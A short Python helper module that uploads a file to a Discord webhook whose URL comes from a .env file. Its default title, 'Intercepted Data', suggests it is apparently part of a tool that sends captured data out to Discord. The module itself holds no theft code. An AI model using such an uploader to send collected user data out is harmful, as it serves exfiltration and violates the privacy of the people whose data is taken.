"""
Discord Helper

Sends files to a Discord webhook. Webhook URL is read from DISCORD_WEBHOOK_URL
environment variable (loaded from .env at project root).
"""

import os
import requests
from dotenv import load_dotenv

load_dotenv(os.path.join(os.path.dirname(os.path.dirname(__file__)), ".env"))

DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")


def send_file_to_discord(filepath: str, title: str = "Intercepted Data") -> bool:
    """Upload a file to Discord via webhook. Returns True on success."""
    if not DISCORD_WEBHOOK_URL:
        print("[discord] DISCORD_WEBHOOK_URL not set in .env")
        return False

    try:
        with open(filepath, "rb") as f:
            resp = requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": title},
                files={"file": (os.path.basename(filepath), f, "application/json")},
                timeout=30,
            )

        if resp.status_code in (200, 204):
            print(f"[discord] File sent: {filepath}")
            return True

        print(f"[discord] Failed ({resp.status_code}): {resp.text}")
        return False

    except Exception as e:
        print(f"[discord] Error: {e}")
        return False
